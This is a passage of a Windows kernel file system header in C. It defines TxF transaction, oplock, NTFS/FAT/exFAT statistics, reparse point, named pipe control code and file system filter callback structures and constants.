typedef struct _TXFS_LIST_TRANSACTIONS {
  ULONGLONG NumberOfTransactions;
  ULONGLONG BufferSizeRequired;
} TXFS_LIST_TRANSACTIONS, *PTXFS_LIST_TRANSACTIONS;

typedef struct _TXFS_READ_BACKUP_INFORMATION_OUT {
  _ANONYMOUS_UNION union {
    ULONG BufferLength;
    UCHAR Buffer[1];
  } DUMMYUNIONNAME;
} TXFS_READ_BACKUP_INFORMATION_OUT, *PTXFS_READ_BACKUP_INFORMATION_OUT;

typedef struct _TXFS_WRITE_BACKUP_INFORMATION {
  UCHAR Buffer[1];
} TXFS_WRITE_BACKUP_INFORMATION, *PTXFS_WRITE_BACKUP_INFORMATION;

#define TXFS_TRANSACTED_VERSION_NONTRANSACTED   0xFFFFFFFE
#define TXFS_TRANSACTED_VERSION_UNCOMMITTED     0xFFFFFFFF

typedef struct _TXFS_GET_TRANSACTED_VERSION {
  ULONG ThisBaseVersion;
  ULONG LatestVersion;
  USHORT ThisMiniVersion;
  USHORT FirstMiniVersion;
  USHORT LatestMiniVersion;
} TXFS_GET_TRANSACTED_VERSION, *PTXFS_GET_TRANSACTED_VERSION;

#define TXFS_SAVEPOINT_SET                      0x00000001
#define TXFS_SAVEPOINT_ROLLBACK                 0x00000002
#define TXFS_SAVEPOINT_CLEAR                    0x00000004
#define TXFS_SAVEPOINT_CLEAR_ALL                0x00000010

typedef struct _TXFS_SAVEPOINT_INFORMATION {
  HANDLE KtmTransaction;
  ULONG ActionCode;
  ULONG SavepointId;
} TXFS_SAVEPOINT_INFORMATION, *PTXFS_SAVEPOINT_INFORMATION;

typedef struct _TXFS_CREATE_MINIVERSION_INFO {
  USHORT StructureVersion;
  USHORT StructureLength;
  ULONG BaseVersion;
  USHORT MiniVersion;
} TXFS_CREATE_MINIVERSION_INFO, *PTXFS_CREATE_MINIVERSION_INFO;

typedef struct _TXFS_TRANSACTION_ACTIVE_INFO {
  BOOLEAN TransactionsActiveAtSnapshot;
} TXFS_TRANSACTION_ACTIVE_INFO, *PTXFS_TRANSACTION_ACTIVE_INFO;

#endif /* (_WIN32_WINNT >= 0x0600) */

#if (_WIN32_WINNT >= 0x0601)

#define MARK_HANDLE_REALTIME                (0x00000020)
#define MARK_HANDLE_NOT_REALTIME            (0x00000040)

#define NO_8DOT3_NAME_PRESENT               (0x00000001)
#define REMOVED_8DOT3_NAME                  (0x00000002)

#define PERSISTENT_VOLUME_STATE_SHORT_NAME_CREATION_DISABLED        (0x00000001)

typedef struct _BOOT_AREA_INFO {
  ULONG BootSectorCount;
  struct {
    LARGE_INTEGER Offset;
  } BootSectors[2];
} BOOT_AREA_INFO, *PBOOT_AREA_INFO;

typedef struct _RETRIEVAL_POINTER_BASE {
  LARGE_INTEGER FileAreaOffset;
} RETRIEVAL_POINTER_BASE, *PRETRIEVAL_POINTER_BASE;

typedef struct _FILE_FS_PERSISTENT_VOLUME_INFORMATION {
  ULONG VolumeFlags;
  ULONG FlagMask;
  ULONG Version;
  ULONG Reserved;
} FILE_FS_PERSISTENT_VOLUME_INFORMATION, *PFILE_FS_PERSISTENT_VOLUME_INFORMATION;

typedef struct _FILE_SYSTEM_RECOGNITION_INFORMATION {
  CHAR FileSystem[9];
} FILE_SYSTEM_RECOGNITION_INFORMATION, *PFILE_SYSTEM_RECOGNITION_INFORMATION;

#define OPLOCK_LEVEL_CACHE_READ         (0x00000001)
#define OPLOCK_LEVEL_CACHE_HANDLE       (0x00000002)
#define OPLOCK_LEVEL_CACHE_WRITE        (0x00000004)

#define REQUEST_OPLOCK_INPUT_FLAG_REQUEST               (0x00000001)
#define REQUEST_OPLOCK_INPUT_FLAG_ACK                   (0x00000002)
#define REQUEST_OPLOCK_INPUT_FLAG_COMPLETE_ACK_ON_CLOSE (0x00000004)

#define REQUEST_OPLOCK_CURRENT_VERSION          1

typedef struct _REQUEST_OPLOCK_INPUT_BUFFER {
  USHORT StructureVersion;
  USHORT StructureLength;
  ULONG RequestedOplockLevel;
  ULONG Flags;
} REQUEST_OPLOCK_INPUT_BUFFER, *PREQUEST_OPLOCK_INPUT_BUFFER;

#define REQUEST_OPLOCK_OUTPUT_FLAG_ACK_REQUIRED     (0x00000001)
#define REQUEST_OPLOCK_OUTPUT_FLAG_MODES_PROVIDED   (0x00000002)

typedef struct _REQUEST_OPLOCK_OUTPUT_BUFFER {
  USHORT StructureVersion;
  USHORT StructureLength;
  ULONG OriginalOplockLevel;
  ULONG NewOplockLevel;
  ULONG Flags;
  ACCESS_MASK AccessMode;
  USHORT ShareMode;
} REQUEST_OPLOCK_OUTPUT_BUFFER, *PREQUEST_OPLOCK_OUTPUT_BUFFER;

#define SD_GLOBAL_CHANGE_TYPE_MACHINE_SID   1

typedef struct _SD_CHANGE_MACHINE_SID_INPUT {
  USHORT CurrentMachineSIDOffset;
  USHORT CurrentMachineSIDLength;
  USHORT NewMachineSIDOffset;
  USHORT NewMachineSIDLength;
} SD_CHANGE_MACHINE_SID_INPUT, *PSD_CHANGE_MACHINE_SID_INPUT;

typedef struct _SD_CHANGE_MACHINE_SID_OUTPUT {
  ULONGLONG NumSDChangedSuccess;
  ULONGLONG NumSDChangedFail;
  ULONGLONG NumSDUnused;
  ULONGLONG NumSDTotal;
  ULONGLONG NumMftSDChangedSuccess;
  ULONGLONG NumMftSDChangedFail;
  ULONGLONG NumMftSDTotal;
} SD_CHANGE_MACHINE_SID_OUTPUT, *PSD_CHANGE_MACHINE_SID_OUTPUT;

typedef struct _SD_GLOBAL_CHANGE_INPUT {
  ULONG Flags;
  ULONG ChangeType;
  _ANONYMOUS_UNION union {
    SD_CHANGE_MACHINE_SID_INPUT SdChange;
  } DUMMYUNIONNAME;
} SD_GLOBAL_CHANGE_INPUT, *PSD_GLOBAL_CHANGE_INPUT;

typedef struct _SD_GLOBAL_CHANGE_OUTPUT {
  ULONG Flags;
  ULONG ChangeType;
  _ANONYMOUS_UNION union {
    SD_CHANGE_MACHINE_SID_OUTPUT SdChange;
  } DUMMYUNIONNAME;
} SD_GLOBAL_CHANGE_OUTPUT, *PSD_GLOBAL_CHANGE_OUTPUT;

#define ENCRYPTED_DATA_INFO_SPARSE_FILE    1

typedef struct _EXTENDED_ENCRYPTED_DATA_INFO {
  ULONG ExtendedCode;
  ULONG Length;
  ULONG Flags;
  ULONG Reserved;
} EXTENDED_ENCRYPTED_DATA_INFO, *PEXTENDED_ENCRYPTED_DATA_INFO;

typedef struct _LOOKUP_STREAM_FROM_CLUSTER_INPUT {
  ULONG Flags;
  ULONG NumberOfClusters;
  LARGE_INTEGER Cluster[1];
} LOOKUP_STREAM_FROM_CLUSTER_INPUT, *PLOOKUP_STREAM_FROM_CLUSTER_INPUT;

typedef struct _LOOKUP_STREAM_FROM_CLUSTER_OUTPUT {
  ULONG Offset;
  ULONG NumberOfMatches;
  ULONG BufferSizeRequired;
} LOOKUP_STREAM_FROM_CLUSTER_OUTPUT, *PLOOKUP_STREAM_FROM_CLUSTER_OUTPUT;

#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_PAGE_FILE          0x00000001
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_DENY_DEFRAG_SET    0x00000002
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_FS_SYSTEM_FILE     0x00000004
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_TXF_SYSTEM_FILE    0x00000008

#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_MASK          0xff000000
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_DATA          0x01000000
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_INDEX         0x02000000
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_SYSTEM        0x03000000

typedef struct _LOOKUP_STREAM_FROM_CLUSTER_ENTRY {
  ULONG OffsetToNext;
  ULONG Flags;
  LARGE_INTEGER Reserved;
  LARGE_INTEGER Cluster;
  WCHAR FileName[1];
} LOOKUP_STREAM_FROM_CLUSTER_ENTRY, *PLOOKUP_STREAM_FROM_CLUSTER_ENTRY;

typedef struct _FILE_TYPE_NOTIFICATION_INPUT {
  ULONG Flags;
  ULONG NumFileTypeIDs;
  GUID FileTypeID[1];
} FILE_TYPE_NOTIFICATION_INPUT, *PFILE_TYPE_NOTIFICATION_INPUT;

#define FILE_TYPE_NOTIFICATION_FLAG_USAGE_BEGIN     0x00000001
#define FILE_TYPE_NOTIFICATION_FLAG_USAGE_END       0x00000002

DEFINE_GUID(FILE_TYPE_NOTIFICATION_GUID_PAGE_FILE,         0x0d0a64a1, 0x38fc, 0x4db8, 0x9f, 0xe7, 0x3f, 0x43, 0x52, 0xcd, 0x7c, 0x5c);
DEFINE_GUID(FILE_TYPE_NOTIFICATION_GUID_HIBERNATION_FILE,  0xb7624d64, 0xb9a3, 0x4cf8, 0x80, 0x11, 0x5b, 0x86, 0xc9, 0x40, 0xe7, 0xb7);
DEFINE_GUID(FILE_TYPE_NOTIFICATION_GUID_CRASHDUMP_FILE,    0x9d453eb7, 0xd2a6, 0x4dbd, 0xa2, 0xe3, 0xfb, 0xd0, 0xed, 0x91, 0x09, 0xa9);

#ifndef _VIRTUAL_STORAGE_TYPE_DEFINED
#define _VIRTUAL_STORAGE_TYPE_DEFINED
typedef struct _VIRTUAL_STORAGE_TYPE {
  ULONG DeviceId;
  GUID VendorId;
} VIRTUAL_STORAGE_TYPE, *PVIRTUAL_STORAGE_TYPE;
#endif

typedef struct _STORAGE_QUERY_DEPENDENT_VOLUME_REQUEST {
  ULONG RequestLevel;
  ULONG RequestFlags;
} STORAGE_QUERY_DEPENDENT_VOLUME_REQUEST, *PSTORAGE_QUERY_DEPENDENT_VOLUME_REQUEST;

#define QUERY_DEPENDENT_VOLUME_REQUEST_FLAG_HOST_VOLUMES    0x1
#define QUERY_DEPENDENT_VOLUME_REQUEST_FLAG_GUEST_VOLUMES   0x2

typedef struct _STORAGE_QUERY_DEPENDENT_VOLUME_LEV1_ENTRY {
  ULONG EntryLength;
  ULONG DependencyTypeFlags;
  ULONG ProviderSpecificFlags;
  VIRTUAL_STORAGE_TYPE VirtualStorageType;
} STORAGE_QUERY_DEPENDENT_VOLUME_LEV1_ENTRY, *PSTORAGE_QUERY_DEPENDENT_VOLUME_LEV1_ENTRY;

typedef struct _STORAGE_QUERY_DEPENDENT_VOLUME_LEV2_ENTRY {
  ULONG EntryLength;
  ULONG DependencyTypeFlags;
  ULONG ProviderSpecificFlags;
  VIRTUAL_STORAGE_TYPE VirtualStorageType;
  ULONG AncestorLevel;
  ULONG HostVolumeNameOffset;
  ULONG HostVolumeNameSize;
  ULONG DependentVolumeNameOffset;
  ULONG DependentVolumeNameSize;
  ULONG RelativePathOffset;
  ULONG RelativePathSize;
  ULONG DependentDeviceNameOffset;
  ULONG DependentDeviceNameSize;
} STORAGE_QUERY_DEPENDENT_VOLUME_LEV2_ENTRY, *PSTORAGE_QUERY_DEPENDENT_VOLUME_LEV2_ENTRY;

typedef struct _STORAGE_QUERY_DEPENDENT_VOLUME_RESPONSE {
  ULONG ResponseLevel;
  ULONG NumberEntries;
  _ANONYMOUS_UNION union {
    STORAGE_QUERY_DEPENDENT_VOLUME_LEV1_ENTRY Lev1Depends[0];
    STORAGE_QUERY_DEPENDENT_VOLUME_LEV2_ENTRY Lev2Depends[0];
  } DUMMYUNIONNAME;
} STORAGE_QUERY_DEPENDENT_VOLUME_RESPONSE, *PSTORAGE_QUERY_DEPENDENT_VOLUME_RESPONSE;

#endif /* (_WIN32_WINNT >= 0x0601) */

typedef struct _FILESYSTEM_STATISTICS {
  USHORT FileSystemType;
  USHORT Version;
  ULONG SizeOfCompleteStructure;
  ULONG UserFileReads;
  ULONG UserFileReadBytes;
  ULONG UserDiskReads;
  ULONG UserFileWrites;
  ULONG UserFileWriteBytes;
  ULONG UserDiskWrites;
  ULONG MetaDataReads;
  ULONG MetaDataReadBytes;
  ULONG MetaDataDiskReads;
  ULONG MetaDataWrites;
  ULONG MetaDataWriteBytes;
  ULONG MetaDataDiskWrites;
} FILESYSTEM_STATISTICS, *PFILESYSTEM_STATISTICS;

#define FILESYSTEM_STATISTICS_TYPE_NTFS     1
#define FILESYSTEM_STATISTICS_TYPE_FAT      2
#define FILESYSTEM_STATISTICS_TYPE_EXFAT    3

typedef struct _FAT_STATISTICS {
  ULONG CreateHits;
  ULONG SuccessfulCreates;
  ULONG FailedCreates;
  ULONG NonCachedReads;
  ULONG NonCachedReadBytes;
  ULONG NonCachedWrites;
  ULONG NonCachedWriteBytes;
  ULONG NonCachedDiskReads;
  ULONG NonCachedDiskWrites;
} FAT_STATISTICS, *PFAT_STATISTICS;

typedef struct _EXFAT_STATISTICS {
  ULONG CreateHits;
  ULONG SuccessfulCreates;
  ULONG FailedCreates;
  ULONG NonCachedReads;
  ULONG NonCachedReadBytes;
  ULONG NonCachedWrites;
  ULONG NonCachedWriteBytes;
  ULONG NonCachedDiskReads;
  ULONG NonCachedDiskWrites;
} EXFAT_STATISTICS, *PEXFAT_STATISTICS;

typedef struct _NTFS_STATISTICS {
  ULONG LogFileFullExceptions;
  ULONG OtherExceptions;
  ULONG MftReads;
  ULONG MftReadBytes;
  ULONG MftWrites;
  ULONG MftWriteBytes;
  struct {
    USHORT Write;
    USHORT Create;
    USHORT SetInfo;
    USHORT Flush;
  } MftWritesUserLevel;
  USHORT MftWritesFlushForLogFileFull;
  USHORT MftWritesLazyWriter;
  USHORT MftWritesUserRequest;
  ULONG Mft2Writes;
  ULONG Mft2WriteBytes;
  struct {
    USHORT Write;
    USHORT Create;
    USHORT SetInfo;
    USHORT Flush;
  } Mft2WritesUserLevel;
  USHORT Mft2WritesFlushForLogFileFull;
  USHORT Mft2WritesLazyWriter;
  USHORT Mft2WritesUserRequest;
  ULONG RootIndexReads;
  ULONG RootIndexReadBytes;
  ULONG RootIndexWrites;
  ULONG RootIndexWriteBytes;
  ULONG BitmapReads;
  ULONG BitmapReadBytes;
  ULONG BitmapWrites;
  ULONG BitmapWriteBytes;
  USHORT BitmapWritesFlushForLogFileFull;
  USHORT BitmapWritesLazyWriter;
  USHORT BitmapWritesUserRequest;
  struct {
    USHORT Write;
    USHORT Create;
    USHORT SetInfo;
  } BitmapWritesUserLevel;
  ULONG MftBitmapReads;
  ULONG MftBitmapReadBytes;
  ULONG MftBitmapWrites;
  ULONG MftBitmapWriteBytes;
  USHORT MftBitmapWritesFlushForLogFileFull;
  USHORT MftBitmapWritesLazyWriter;
  USHORT MftBitmapWritesUserRequest;
  struct {
    USHORT Write;
    USHORT Create;
    USHORT SetInfo;
    USHORT Flush;
  } MftBitmapWritesUserLevel;
  ULONG UserIndexReads;
  ULONG UserIndexReadBytes;
  ULONG UserIndexWrites;
  ULONG UserIndexWriteBytes;
  ULONG LogFileReads;
  ULONG LogFileReadBytes;
  ULONG LogFileWrites;
  ULONG LogFileWriteBytes;
  struct {
    ULONG Calls;
    ULONG Clusters;
    ULONG Hints;
    ULONG RunsReturned;
    ULONG HintsHonored;
    ULONG HintsClusters;
    ULONG Cache;
    ULONG CacheClusters;
    ULONG CacheMiss;
    ULONG CacheMissClusters;
  } Allocate;
} NTFS_STATISTICS, *PNTFS_STATISTICS;

#endif /* _FILESYSTEMFSCTL_ */

#define SYMLINK_FLAG_RELATIVE   1

typedef struct _REPARSE_DATA_BUFFER {
  ULONG ReparseTag;
  USHORT ReparseDataLength;
  USHORT Reserved;
  _ANONYMOUS_UNION union {
    struct {
      USHORT SubstituteNameOffset;
      USHORT SubstituteNameLength;
      USHORT PrintNameOffset;
      USHORT PrintNameLength;
      ULONG Flags;
      WCHAR PathBuffer[1];
    } SymbolicLinkReparseBuffer;
    struct {
      USHORT SubstituteNameOffset;
      USHORT SubstituteNameLength;
      USHORT PrintNameOffset;
      USHORT PrintNameLength;
      WCHAR PathBuffer[1];
    } MountPointReparseBuffer;
    struct {
      UCHAR DataBuffer[1];
    } GenericReparseBuffer;
  } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_SIZE   FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer)

typedef struct _REPARSE_GUID_DATA_BUFFER {
  ULONG ReparseTag;
  USHORT ReparseDataLength;
  USHORT Reserved;
  GUID ReparseGuid;
  struct {
    UCHAR DataBuffer[1];
  } GenericReparseBuffer;
} REPARSE_GUID_DATA_BUFFER, *PREPARSE_GUID_DATA_BUFFER;

#define REPARSE_GUID_DATA_BUFFER_HEADER_SIZE   FIELD_OFFSET(REPARSE_GUID_DATA_BUFFER, GenericReparseBuffer)

#define MAXIMUM_REPARSE_DATA_BUFFER_SIZE      ( 16 * 1024 )

/* Reserved reparse tags */
#define IO_REPARSE_TAG_RESERVED_ZERO            (0)
#define IO_REPARSE_TAG_RESERVED_ONE             (1)
#define IO_REPARSE_TAG_RESERVED_RANGE           IO_REPARSE_TAG_RESERVED_ONE

#define IsReparseTagMicrosoft(_tag)             (((_tag) & 0x80000000))
#define IsReparseTagNameSurrogate(_tag)         (((_tag) & 0x20000000))

#define IO_REPARSE_TAG_VALID_VALUES             (0xF000FFFF)

#define IsReparseTagValid(tag) (                               \
                  !((tag) & ~IO_REPARSE_TAG_VALID_VALUES) &&   \
                  ((tag) > IO_REPARSE_TAG_RESERVED_RANGE)      \
                )

/* MicroSoft reparse point tags */
#define IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)
#define IO_REPARSE_TAG_HSM                      (0xC0000004L)
#define IO_REPARSE_TAG_DRIVE_EXTENDER           (0x80000005L)
#define IO_REPARSE_TAG_HSM2                     (0x80000006L)
#define IO_REPARSE_TAG_SIS                      (0x80000007L)
#define IO_REPARSE_TAG_WIM                      (0x80000008L)
#define IO_REPARSE_TAG_CSV                      (0x80000009L)
#define IO_REPARSE_TAG_DFS                      (0x8000000AL)
#define IO_REPARSE_TAG_FILTER_MANAGER           (0x8000000BL)
#define IO_REPARSE_TAG_SYMLINK                  (0xA000000CL)
#define IO_REPARSE_TAG_IIS_CACHE                (0xA0000010L)
#define IO_REPARSE_TAG_DFSR                     (0x80000012L)

#pragma pack(4)
typedef struct _REPARSE_INDEX_KEY {
  ULONG FileReparseTag;
  LARGE_INTEGER FileId;
} REPARSE_INDEX_KEY, *PREPARSE_INDEX_KEY;
#pragma pack()

#define FSCTL_LMR_GET_LINK_TRACKING_INFORMATION   CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM,58,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define FSCTL_LMR_SET_LINK_TRACKING_INFORMATION   CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM,59,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define IOCTL_LMR_ARE_FILE_OBJECTS_ON_SAME_SERVER CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM,60,METHOD_BUFFERED,FILE_ANY_ACCESS)

#define FSCTL_PIPE_ASSIGN_EVENT             CTL_CODE(FILE_DEVICE_NAMED_PIPE, 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_DISCONNECT               CTL_CODE(FILE_DEVICE_NAMED_PIPE, 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_LISTEN                   CTL_CODE(FILE_DEVICE_NAMED_PIPE, 2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_PEEK                     CTL_CODE(FILE_DEVICE_NAMED_PIPE, 3, METHOD_BUFFERED, FILE_READ_DATA)
#define FSCTL_PIPE_QUERY_EVENT              CTL_CODE(FILE_DEVICE_NAMED_PIPE, 4, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_TRANSCEIVE               CTL_CODE(FILE_DEVICE_NAMED_PIPE, 5, METHOD_NEITHER,  FILE_READ_DATA | FILE_WRITE_DATA)
#define FSCTL_PIPE_WAIT                     CTL_CODE(FILE_DEVICE_NAMED_PIPE, 6, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_IMPERSONATE              CTL_CODE(FILE_DEVICE_NAMED_PIPE, 7, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_SET_CLIENT_PROCESS       CTL_CODE(FILE_DEVICE_NAMED_PIPE, 8, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_QUERY_CLIENT_PROCESS     CTL_CODE(FILE_DEVICE_NAMED_PIPE, 9, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_GET_PIPE_ATTRIBUTE       CTL_CODE(FILE_DEVICE_NAMED_PIPE, 10, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_SET_PIPE_ATTRIBUTE       CTL_CODE(FILE_DEVICE_NAMED_PIPE, 11, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_GET_CONNECTION_ATTRIBUTE CTL_CODE(FILE_DEVICE_NAMED_PIPE, 12, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_SET_CONNECTION_ATTRIBUTE CTL_CODE(FILE_DEVICE_NAMED_PIPE, 13, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_GET_HANDLE_ATTRIBUTE     CTL_CODE(FILE_DEVICE_NAMED_PIPE, 14, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_SET_HANDLE_ATTRIBUTE     CTL_CODE(FILE_DEVICE_NAMED_PIPE, 15, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_PIPE_FLUSH                    CTL_CODE(FILE_DEVICE_NAMED_PIPE, 16, METHOD_BUFFERED, FILE_WRITE_DATA)

#define FSCTL_PIPE_INTERNAL_READ            CTL_CODE(FILE_DEVICE_NAMED_PIPE, 2045, METHOD_BUFFERED, FILE_READ_DATA)
#define FSCTL_PIPE_INTERNAL_WRITE           CTL_CODE(FILE_DEVICE_NAMED_PIPE, 2046, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_PIPE_INTERNAL_TRANSCEIVE      CTL_CODE(FILE_DEVICE_NAMED_PIPE, 2047, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define FSCTL_PIPE_INTERNAL_READ_OVFLOW     CTL_CODE(FILE_DEVICE_NAMED_PIPE, 2048, METHOD_BUFFERED, FILE_READ_DATA)

#define FILE_PIPE_READ_DATA                 0x00000000
#define FILE_PIPE_WRITE_SPACE               0x00000001

typedef struct _FILE_PIPE_ASSIGN_EVENT_BUFFER {
  HANDLE EventHandle;
  ULONG KeyValue;
} FILE_PIPE_ASSIGN_EVENT_BUFFER, *PFILE_PIPE_ASSIGN_EVENT_BUFFER;

typedef struct _FILE_PIPE_EVENT_BUFFER {
  ULONG NamedPipeState;
  ULONG EntryType;
  ULONG ByteCount;
  ULONG KeyValue;
  ULONG NumberRequests;
} FILE_PIPE_EVENT_BUFFER, *PFILE_PIPE_EVENT_BUFFER;

typedef struct _FILE_PIPE_PEEK_BUFFER {
  ULONG NamedPipeState;
  ULONG ReadDataAvailable;
  ULONG NumberOfMessages;
  ULONG MessageLength;
  CHAR Data[1];
} FILE_PIPE_PEEK_BUFFER, *PFILE_PIPE_PEEK_BUFFER;

typedef struct _FILE_PIPE_WAIT_FOR_BUFFER {
  LARGE_INTEGER Timeout;
  ULONG NameLength;
  BOOLEAN TimeoutSpecified;
  WCHAR Name[1];
} FILE_PIPE_WAIT_FOR_BUFFER, *PFILE_PIPE_WAIT_FOR_BUFFER;

typedef struct _FILE_PIPE_CLIENT_PROCESS_BUFFER {
#if !defined(BUILD_WOW6432)
  PVOID ClientSession;
  PVOID ClientProcess;
#else
  ULONGLONG ClientSession;
  ULONGLONG ClientProcess;
#endif
} FILE_PIPE_CLIENT_PROCESS_BUFFER, *PFILE_PIPE_CLIENT_PROCESS_BUFFER;

#define FILE_PIPE_COMPUTER_NAME_LENGTH 15

typedef struct _FILE_PIPE_CLIENT_PROCESS_BUFFER_EX {
#if !defined(BUILD_WOW6432)
  PVOID ClientSession;
  PVOID ClientProcess;
#else
  ULONGLONG ClientSession;
  ULONGLONG ClientProcess;
#endif
  USHORT ClientComputerNameLength;
  WCHAR ClientComputerBuffer[FILE_PIPE_COMPUTER_NAME_LENGTH+1];
} FILE_PIPE_CLIENT_PROCESS_BUFFER_EX, *PFILE_PIPE_CLIENT_PROCESS_BUFFER_EX;

#define FSCTL_MAILSLOT_PEEK             CTL_CODE(FILE_DEVICE_MAILSLOT, 0, METHOD_NEITHER, FILE_READ_DATA)

typedef enum _LINK_TRACKING_INFORMATION_TYPE {
  NtfsLinkTrackingInformation,
  DfsLinkTrackingInformation
} LINK_TRACKING_INFORMATION_TYPE, *PLINK_TRACKING_INFORMATION_TYPE;

typedef struct _LINK_TRACKING_INFORMATION {
  LINK_TRACKING_INFORMATION_TYPE Type;
  UCHAR VolumeId[16];
} LINK_TRACKING_INFORMATION, *PLINK_TRACKING_INFORMATION;

typedef struct _REMOTE_LINK_TRACKING_INFORMATION {
  PVOID TargetFileObject;
  ULONG TargetLinkTrackingInformationLength;
  UCHAR TargetLinkTrackingInformationBuffer[1];
} REMOTE_LINK_TRACKING_INFORMATION, *PREMOTE_LINK_TRACKING_INFORMATION;

#define IO_OPEN_PAGING_FILE                 0x0002
#define IO_OPEN_TARGET_DIRECTORY            0x0004
#define IO_STOP_ON_SYMLINK                  0x0008
#define IO_MM_PAGING_FILE                   0x0010

typedef VOID
(NTAPI *PDRIVER_FS_NOTIFICATION) (
  IN PDEVICE_OBJECT DeviceObject,
  IN BOOLEAN FsActive);

typedef enum _FS_FILTER_SECTION_SYNC_TYPE {
  SyncTypeOther = 0,
  SyncTypeCreateSection
} FS_FILTER_SECTION_SYNC_TYPE, *PFS_FILTER_SECTION_SYNC_TYPE;

typedef enum _FS_FILTER_STREAM_FO_NOTIFICATION_TYPE {
  NotifyTypeCreate = 0,
  NotifyTypeRetired
} FS_FILTER_STREAM_FO_NOTIFICATION_TYPE, *PFS_FILTER_STREAM_FO_NOTIFICATION_TYPE;

typedef union _FS_FILTER_PARAMETERS {
  struct {
    PLARGE_INTEGER EndingOffset;
    PERESOURCE *ResourceToRelease;
  } AcquireForModifiedPageWriter;
  struct {
    PERESOURCE ResourceToRelease;
  } ReleaseForModifiedPageWriter;
  struct {
    FS_FILTER_SECTION_SYNC_TYPE SyncType;
    ULONG PageProtection;
  } AcquireForSectionSynchronization;
  struct {
    FS_FILTER_STREAM_FO_NOTIFICATION_TYPE NotificationType;
    BOOLEAN POINTER_ALIGNMENT SafeToRecurse;
  } NotifyStreamFileObject;
  struct {
    PVOID Argument1;
    PVOID Argument2;
    PVOID Argument3;
    PVOID Argument4;
    PVOID Argument5;
  } Others;
} FS_FILTER_PARAMETERS, *PFS_FILTER_PARAMETERS;

#define FS_FILTER_ACQUIRE_FOR_SECTION_SYNCHRONIZATION      (UCHAR)-1
#define FS_FILTER_RELEASE_FOR_SECTION_SYNCHRONIZATION      (UCHAR)-2
#define FS_FILTER_ACQUIRE_FOR_MOD_WRITE                    (UCHAR)-3
#define FS_FILTER_RELEASE_FOR_MOD_WRITE                    (UCHAR)-4
#define FS_FILTER_ACQUIRE_FOR_CC_FLUSH                     (UCHAR)-5
#define FS_FILTER_RELEASE_FOR_CC_FLUSH                     (UCHAR)-6

typedef struct _FS_FILTER_CALLBACK_DATA {
  ULONG SizeOfFsFilterCallbackData;
  UCHAR Operation;
  UCHAR Reserved;
  struct _DEVICE_OBJECT *DeviceObject;
  struct _FILE_OBJECT *FileObject;
  FS_FILTER_PARAMETERS Parameters;
} FS_FILTER_CALLBACK_DATA, *PFS_FILTER_CALLBACK_DATA;

typedef NTSTATUS
(NTAPI *PFS_FILTER_CALLBACK) (
  IN PFS_FILTER_CALLBACK_DATA Data,
  OUT PVOID *CompletionContext);

typedef VOID
(NTAPI *PFS_FILTER_COMPLETION_CALLBACK) (
  IN PFS_FILTER_CALLBACK_DATA Data,
  IN NTSTATUS OperationStatus,
  IN PVOID CompletionContext);

typedef struct _FS_FILTER_CALLBACKS {
  ULONG SizeOfFsFilterCallbacks;
  ULONG Reserved;
  PFS_FILTER_CALLBACK PreAcquireForSectionSynchronization;
  PFS_FILTER_COMPLETION_CALLBACK PostAcquireForSectionSynchronization;
  PFS_FILTER_CALLBACK PreReleaseForSectionSynchronization;
  PFS_FILTER_COMPLETION_CALLBACK PostReleaseForSectionSynchronization;
  PFS_FILTER_CALLBACK PreAcquireForCcFlush;
  PFS_FILTER_COMPLETION_CALLBACK PostAcquireForCcFlush;
  PFS_FILTER_CALLBACK PreReleaseForCcFlush;
  PFS_FILTER_COMPLETION_CALLBACK PostReleaseForCcFlush;
  PFS_FILTER_CALLBACK PreAcquireForModifiedPageWriter;
  PFS_FILTER_COMPLETION_CALLBACK PostAcquireForModifiedPageWriter;
  PFS_FILTER_CALLBACK PreReleaseForModifiedPageWriter;
  PFS_FILTER_COMPLETION_CALLBACK PostReleaseForModifiedPageWriter;
} FS_FILTER_CALLBACKS, *PFS_FILTER_CALLBACKS;

#if (NTDDI_VERSION >= NTDDI_WINXP)
NTKERNELAPI
NTSTATUS
NTAPI
FsRtlRegisterFileSystemFilterCallbacks(
  IN struct _DRIVER_OBJECT *FilterDriverObject,
  IN PFS_FILTER_CALLBACKS Callbacks);
#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_VISTA)
NTKERNELAPI
NTSTATUS
NTAPI
